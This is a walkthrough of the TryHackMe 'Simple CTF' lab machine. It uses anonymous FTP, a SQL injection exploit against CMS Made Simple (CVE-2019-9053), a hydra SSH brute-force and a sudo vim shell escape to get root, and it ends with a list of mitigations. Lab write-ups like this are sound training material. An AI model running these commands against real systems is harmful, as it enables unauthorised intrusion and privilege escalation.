
# Simple CTF Walkthrough

## Overview
This walkthrough documents the exploitation of the **Simple CTF** machine on TryHackMe.  
The machine highlights multiple attack vectors:
- FTP misconfiguration
- Vulnerable CMS (CMS Made Simple)
- Weak/reused credentials
- Privilege escalation via sudo misconfiguration

---

## Reconnaissance
### Network Discovery
```bash
nmap -sV -p- <IP_ADDRESS>
```


**Results:**

* `21/tcp` → FTP (vsftpd)
* `80/tcp` → HTTP (Apache httpd, CMS Made Simple)
* `2222/tcp` → SSH (OpenSSH)

⚠️ SSH running on a non-standard port (`2222`) suggests "security through obscurity" and potential misconfigurations.

---

## Initial Access

### Path A: FTP Anonymous Login

```bash
ftp <IP_ADDRESS>
Username: anonymous
Password: (blank)
```

✅ **Login successful**

Discovered file:

```bash
cd pub
get ForMitch.txt
cat ForMitch.txt
```

📄 Revealed **user `mitch`** with a weak, reused password.

---

### Path B: Web Vulnerability (CMS)

Directory enumeration:

```bash
dirbuster -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirb/common.txt
```

Found `/simple` → **CMS Made Simple**

Exploit search:

```bash
searchsploit cms made simple
```

Identified vulnerability **CVE-2019-9053 (SQL Injection)**

Exploitation:

```bash
python 46635.py -u http://<IP_ADDRESS>/simple --crack -w /usr/share/wordlists/rockyou.txt
```

✅ **Credentials Recovered:**

| Username | Password |
| -------- | -------- |
| mitch    | secret   |

---

## Gaining Shell Access

SSH brute-force (optional, confirmed password):

```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://<IP_ADDRESS>:2222
```

Direct SSH login:

```bash
ssh mitch@<IP_ADDRESS> -p 2222
Password: secret
```

✅ **User Flag**

```bash
cat user.txt
```

---

## Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Allowed to run `/usr/bin/vim` as root.

Exploit Vim shell escape:

```bash
sudo vim -c ':!/bin/sh'
```

✅ **Root shell obtained**

Root Flag:

```bash
cd /root
cat root.txt
```

---

## Key Findings

* Insecure FTP service (Anonymous login enabled, CVE-1999-0497)
* Outdated CMS vulnerable to SQL Injection (CVE-2019-9053)
* Weak/reused credentials
* Sudo misconfiguration (allowed execution of Vim as root)

---

## Mitigations

* ❌ Disable anonymous FTP access
* 🔑 Enforce strong password policies + MFA
* 🔄 Apply timely CMS updates
* 🔒 Restrict sudo privileges (principle of least privilege)

---

## Conclusion

This machine demonstrated how **stacked misconfigurations** (weak passwords + outdated software + insecure sudo rules) can lead to a **full system compromise**.
